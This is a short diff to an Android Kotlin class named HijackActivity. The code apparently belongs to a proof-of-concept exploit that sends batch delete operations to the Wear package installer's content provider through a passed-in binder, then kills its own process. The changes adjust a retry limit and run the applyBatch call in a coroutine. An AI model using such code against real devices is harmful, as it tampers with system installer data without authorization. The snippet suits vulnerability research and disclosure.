@@ -16,13 +16,13 @@ class HijackActivity : AppCompatActivity() {
     companion object {
         private const val authority = "com.google.android.packageinstaller.wear.provider"
         private const val uri = "content://$authority"
-        const val limit = 2
+        const val limit = 6
         val source = "a b c d e f g".split(" ")
         private val request = ContentProviderOperation.newDelete(Uri.parse(uri)).build()
     }
 
     val binder by lazy {
-        intent.getIBinderExtra(MainActivity.Key)
+        intent.getIBinderExtra(MainActivity.Key)!!
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -39,7 +39,9 @@ class HijackActivity : AppCompatActivity() {
                             Parcel.obtain(),
                             0
                         )
-                        contentResolver.applyBatch(authority, arrayListOf(request))
+                        launch {
+                            contentResolver.applyBatch(authority, arrayListOf(request))
+                        }
                         Log.e(TAG, "commit applyBatch operation to package installer")
                         delay(200L)
                         exitProcess(0)
